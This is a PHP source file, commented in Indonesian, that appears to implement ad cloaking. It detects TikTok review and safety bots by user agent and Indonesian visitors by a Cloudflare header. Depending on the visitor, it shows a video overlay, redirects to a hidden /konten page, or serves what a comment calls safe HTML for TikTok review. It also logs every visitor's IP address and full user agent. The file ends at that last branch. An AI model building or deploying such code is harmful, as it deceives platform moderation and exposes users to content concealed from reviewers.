<?php
// FUNGSI UTAMA: Deteksi TikTok/trill
function is_tiktok_related() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    $tiktok_patterns = [
        'TikTokAdsBot',
        'TikTokContentReview',
        'TikTokSafetyBot', 
        'TikTokLPChecker',
        'TikTokAdsMonitor',
        'TikTokLiveReview',
        'TikTokBot',
        'Bytespider',
        'trill',
        'AppName/trill',
        'ByteLocale',
        'aweme',
        'musically'
    ];
    
    foreach ($tiktok_patterns as $pattern) {
        if (stripos($ua, $pattern) !== false) {
            return true;
        }
    }
    
    return false;
}

// MAIN LOGIC
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$is_tiktok = is_tiktok_related();
$is_indonesia = ($country === 'ID');

// SIMPAN LOG
$log_data = "IP: " . $ip . "\n";
$log_data .= "COUNTRY: " . $country . "\n";
$log_data .= "USER AGENT (FULL):\n" . $user_agent . "\n";
$log_data .= "DETECTED AS: " . ($is_tiktok ? 'TikTok/Trill Related' : 'Regular User') . "\n";

// KONDISI 1: Trill + IP Indonesia ‚Üí OVERLAY VIDEO
if ($is_tiktok && $is_indonesia && stripos($user_agent, 'trill') !== false) {
    $log_data .= "ACTION: Show Video Overlay (Trill Indonesia)\n\n";
    file_put_contents('all_access.log', $log_data, FILE_APPEND);
    
    header('Content-Type: text/html; charset=utf-8');
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Official Store - Premium Products</title>
    </head>
    <body style="margin:0;background:#000;">
        <video style="width:100%;height:100vh;object-fit:cover;" autoplay loop muted playsinline>
            <source src="https://tiktok01.restomaknyus.online/img/tiktokshop12.mp4" type="video/mp4">
        </video>
    </body>
    </html>
    <?php
    exit;
}

// KONDISI 2: Non-Trill + IP Indonesia ‚Üí REDIRECT ke /konten
if (!$is_tiktok && $is_indonesia) {
    $log_data .= "ACTION: Redirect to /konten (Non-Trill Indonesia)\n\n";
    file_put_contents('all_access.log', $log_data, FILE_APPEND);
    
    // Redirect ke /konten
    header("Location: /konten");
    exit;
}

// KONDISI 3: SEMUA LAINNYA ‚Üí HTML AMAN UNTUK TIKTOK REVIEW
